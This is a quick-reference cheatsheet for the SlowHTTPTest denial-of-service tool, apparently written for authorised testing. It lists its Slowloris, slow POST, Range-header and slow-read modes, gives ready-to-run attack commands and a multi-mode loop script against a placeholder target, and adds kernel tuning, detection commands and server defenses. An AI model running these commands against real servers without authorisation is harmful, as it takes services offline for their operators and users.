# SlowHTTPTest — Quick Reference Cheatsheet

## Installation
```bash
sudo apt install slowhttptest
# or from source:
git clone https://github.com/shekyan/slowhttptest.git && cd slowhttptest && ./configure && make && sudo make install
```

## Syntax
```
slowhttptest [options] -u <target_url>
```

## Attack Modes

| Flag | Mode | Attack |
|------|------|--------|
| `-H` | Slowloris | Incomplete HTTP headers, exhaust connection pool |
| `-B` | Slow Body | Slow POST body, exhaust input buffers |
| `-R` | Range Header | Apache Killer — overlapping Range headers |
| `-X` | Slow Read | Tiny TCP windows, drain response slowly |

## Core Parameters

| Flag | Description | Default |
|------|-------------|---------|
| `-u URL` | Target URL (required) | — |
| `-c N` | Number of connections | 50 |
| `-l N` | Test duration (seconds) | 240 |
| `-r N` | Connection rate (conn/sec) | 50 |
| `-i N` | Follow-up interval (sec) | 10 |
| `-t VERB` | HTTP verb | GET |
| `-p N` | Probe timeout (sec) | 5 |

## Slow Headers / Slow Body Options

| Flag | Description | Default |
|------|-------------|---------|
| `-s N` | Content-Length (Slow POST) | 4096 |
| `-x N` | Max follow-up data length | 32 |
| `-f TYPE` | Content-Type header | application/x-www-form-urlencoded |
| `-m ACCEPT` | Accept header | text/html;q=0.9,... |
| `-j COOKIES` | Cookie header | — |

## Slow Read Options

| Flag | Description | Default |
|------|-------------|---------|
| `-k N` | Pipeline repeat factor | 1 |
| `-n N` | Read interval (sec) | 1 |
| `-w N` | TCP window size start | 1 |
| `-y N` | TCP window size end | 512 |
| `-z N` | Bytes per read() call | 5 |

## Range Attack Options

| Flag | Description | Default |
|------|-------------|---------|
| `-a N` | Range left boundary | 5 |
| `-b N` | Range right boundary limit | 2000 |

## Reporting

| Flag | Description |
|------|-------------|
| `-g` | Generate HTML + CSV statistics |
| `-o PREFIX` | Output file prefix (with -g) |
| `-v N` | Verbosity: 0=Fatal 1=Info 2=Error 3=Warn 4=Debug |

## Proxy Options

| Flag | Description |
|------|-------------|
| `-d HOST:PORT` | Route all traffic through proxy |
| `-e HOST:PORT` | Route probe traffic through proxy |

## Quick Commands

```bash
# Basic Slowloris test
slowhttptest -H -u http://target.com/ -c 1000 -r 200 -i 10 -l 240 -g -o results

# Slow POST test
slowhttptest -B -u http://target.com/login -c 3000 -s 8192 -i 110 -r 200 -l 240 -g -o slow_post

# Apache Range Header attack
slowhttptest -R -u http://target.com/ -t HEAD -c 1000 -a 10 -b 3000 -r 500 -l 240

# Slow Read attack
slowhttptest -X -u http://target.com/ -c 8000 -w 512 -y 1024 -n 5 -z 32 -k 3 -r 200 -l 240

# Quick vulnerability check (30 seconds, 500 connections)
slowhttptest -H -u http://target.com/ -c 500 -r 100 -l 30 -v 1

# Through HTTP proxy
slowhttptest -H -u http://target.com/ -d 127.0.0.1:8080 -c 500 -r 100 -l 60

# With cookies (authenticated endpoint)
slowhttptest -H -u https://target.com/dashboard -j "session=abc123" -c 500 -r 100 -l 120

# Generate detailed report
slowhttptest -H -u http://target.com/ -c 1000 -r 200 -l 240 -g -o attack_report -v 2
```

## Example: Full Assessment Script

```bash
#!/bin/bash
TARGET="$1"
DURATION="${2:-120}"
for MODE in "-H" "-B" "-X"; do
    slowhttptest $MODE -u "$TARGET" -c 500 -r 100 -l "$DURATION" -p 3 -g -o "test_${MODE}"
    sleep 30
done
```

## System Tuning for High Connections

```bash
ulimit -n 65535
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535
sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
```

## Detection Signatures

```bash
# Monitor connections per IP
ss -ant '( sport = :80 )' | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head

# Apache worker status
curl -s http://localhost/server-status?auto | jq '.BusyWorkers, .IdleWorkers'
```

## Quick Defenses

```bash
# iptables: limit connections per IP
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT

# Nginx: set tight timeouts
client_body_timeout 10s; client_header_timeout 10s; keepalive_timeout 15s;

# Apache: enable mod_reqtimeout
sudo a2enmod reqtimeout
```

## MITRE ATT&CK
- **Tactic:** Impact (TA0040)
- **Technique:** T1499 — Endpoint Denial of Service
- **Sub-techniques:** T1499.001 (OS Exhaustion), T1499.002 (Service Exhaustion), T1499.003 (Application Exhaustion)
